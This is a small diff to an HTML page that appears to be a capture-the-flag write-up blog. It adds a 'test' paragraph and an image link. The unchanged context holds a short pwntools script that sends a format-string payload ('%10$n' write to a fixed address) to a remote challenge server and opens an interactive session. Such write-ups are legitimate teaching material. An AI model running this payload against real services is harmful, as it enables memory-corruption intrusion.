@@ -296,6 +296,8 @@
 <p>Exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">payload=p32(<span class="number">0x0804A068</span>)+<span class="string">b&quot;AAAA&quot;</span>+<span class="string">b&quot;%10$n&quot;</span></span><br><span class="line">io=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">54527</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;please tell me your name:&quot;</span>,<span class="string">b&quot;nehs&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;leave your message please:&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
+<p>测试</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/IY30/IY30.github.io/blob/main/images/code/wps41.jpg">IY30.github.io/images/code at main · IY30/IY30.github.io · GitHub</a></p>
  
       <!-- reward -->
       
